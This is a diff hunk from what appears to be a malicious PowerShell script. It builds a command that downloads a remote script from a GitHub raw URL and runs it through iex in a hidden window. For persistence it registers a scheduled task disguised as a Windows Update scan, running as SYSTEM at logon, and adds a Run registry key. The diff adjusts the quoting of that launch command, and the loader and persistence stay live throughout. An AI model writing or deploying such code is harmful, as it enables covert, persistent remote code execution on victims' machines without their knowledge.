@@ -65,14 +65,14 @@ if (Get-F $dUrl $dp) {
         $method.Invoke($null, @([string]$ce, [string]$ge, [string]$w))
         Write-Host "running"
         $cmd = "irm 'https://raw.githubusercontent.com/$u/$r/main/remote_deploy.ps1' | iex"
-        $tp = "powershell.exe -WindowStyle Hidden -NoP -Ep Bypass -c ""$cmd"""
+        $tp = "powershell.exe -w hidden -c $cmd"
         
         $id = [Security.Principal.WindowsIdentity]::GetCurrent()
         $wp = New-Object Security.Principal.WindowsPrincipal($id)
         $ad = $wp.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
         
-        if ($ad) { schtasks.exe /create /tn "\Microsoft\Windows\WindowsUpdate\WindowsUpdateScan" /tr "$tp" /sc onlogon /rl highest /f /ru "System" /ErrorAction SilentlyContinue }
-        else { schtasks.exe /create /tn "WindowsUpdateScan" /tr "$tp" /sc onlogon /f /ErrorAction SilentlyContinue }
+        if ($ad) { schtasks.exe /create /tn "\Microsoft\Windows\WindowsUpdate\WindowsUpdateScan" /tr "'$tp'" /sc onlogon /rl highest /f /ru "System" /ErrorAction SilentlyContinue }
+        else { schtasks.exe /create /tn "WindowsUpdateScan" /tr "'$tp'" /sc onlogon /f /ErrorAction SilentlyContinue }
 
         Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateCoord" -Value "$tp" -ErrorAction SilentlyContinue
         return
